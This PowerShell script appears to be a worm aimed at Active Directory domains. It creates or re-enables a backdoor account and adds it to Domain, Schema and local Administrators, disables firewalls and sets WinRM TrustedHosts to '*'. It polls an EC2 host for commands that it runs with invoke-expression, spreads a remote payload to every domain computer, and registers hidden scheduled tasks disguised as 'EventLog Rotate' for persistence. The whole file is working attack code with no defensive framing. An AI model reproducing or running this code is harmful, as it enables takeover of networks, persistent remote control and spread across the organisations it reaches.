﻿if(1 -eq 1){
    $fun = 'much'
}
else{
    $idk = 'Didnt think this far'
}
remove-item c:\Windows\EventLog.ps1
[net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
import-module activedirectory
set-executionpolicy Unrestricted

Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
$toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
$c0de='Tossking@'
$c0de=$c0de+$toAppend
$username='magrene'
$usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
[SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
[PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString

if($osInfo.ProductType -ne 1){
    $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
}
else{
    $rootDN=[system.net.dns]::GetHostByName((hostname)).Hostname
    $rootFirst=$rootDN.split('.')[-2]
    $rootSecond=$rootDN.split('.')[-1]
    $rootDN=$rootFirst + "." + $rootSecond
    
    $DCIP=Resolve-DnsName $rootDN | where-object{$_.Type -eq 'A'} | select IPAddress | foreach {$_.IPAddress}
    $ADDSName=(Resolve-DnsName $DCIP | foreach {$_.NameHost})
    $computerNames=invoke-command -ComputerName $ADDSName -ScriptBlock {get-adcomputer -filter * | foreach {$_.DNSHostName}}
}

$domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ipv4address , dnshostname



if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTextServiceDa.txt')){
    try{mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'}
    catch{}
    
    cd 'C:\Program Files (x86)\Windows NT\TableTextService'
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/TableTextServiceDa.txt","C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt")
}


function accountPersist{

    try{
        Get-aduser $username
        enable-adaccount $username
        Set-ADAccountPassword -Identity $username -NewPassword (ConvertTo-SecureString -AsPlainText $c0de -Force)
        Add-ADGroupMember -identity 'Domain Admins' -members $username
        Add-ADGroupMember -identity 'Administrators' -members $username
        Add-ADGroupMember -identity 'Schema Admins' -members $username
        
    }
    catch{
        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
        Add-ADGroupMember -identity 'Domain Admins' -members $username
        Add-ADGroupMember -identity 'Administrators' -members $username
        Add-ADGroupMember -identity 'Schema Admins' -members $username
    }


}


function keepWINRMAlive{
    While(1 -eq 1){
        Enable-PSRemoting -force
        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
    }
}
function wormy{
    
    while(1 -eq 1){
    $httpCommand=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt
    invoke-expression $httpCommand
    accountPersist
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
    Write-Output 'slither'
    Set-Service -Name WinRM -StartupType Automatic
    Set-Service -Name Winmgmt -StartupType Automatic
    Start-Service WinRM
    Start-Service Winmgmt
    Foreach($i in $computerNames){
        Write-Output $i
        invoke-command -ComputerName $i -Credential $credential -ScriptBlock {
            if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                    Invoke-Command -ScriptBlock {
                    set-executionpolicy Unrestricted
                    $WebClient = New-Object System.Net.WebClient
                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
                    }
                }
            }
            else{
                    set-executionpolicy Unrestricted
                    $WebClient = New-Object System.Net.WebClient
                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
            }
            }
        }
        
        accountPersist
        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
    }
}


start-job -ScriptBlock{
    
    $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
    $username='magrene'
    $c0de='Tossking@'
    $c0de=$c0de+$toAppend
    try{
        Get-aduser $username
        enable-adaccount $username
        Set-ADAccountPassword -Identity $username -NewPassword (ConvertTo-SecureString -AsPlainText $c0de -Force)
        Add-ADGroupMember -identity 'Domain Admins' -members $username
        Add-ADGroupMember -identity 'Administrators' -members $username
        Add-ADGroupMember -identity 'Schema Admins' -members $username
        
    }
    catch{
        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
        Add-ADGroupMember -identity 'Domain Admins' -members $username
        Add-ADGroupMember -identity 'Administrators' -members $username
        Add-ADGroupMember -identity 'Schema Admins' -members $username
    }
    start-sleep -seconds 315

}

start-job -ScriptBlock{

    While(1 -eq 1){
        Enable-PSRemote -force
        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)

    }
}

start-job -ScriptBlock { 
    while(1 -eq 1){
        try{
            $action = @()
            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
            
            $trigger = New-ScheduledTaskTrigger -AtStartup
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\SpacePort -force
        
        
            $action = @()
            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
            $trigger = New-ScheduledTaskTrigger -AtLogon
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotater" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\Bitlocker -force
        }
        catch{

        }
        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
    }
}


wormy
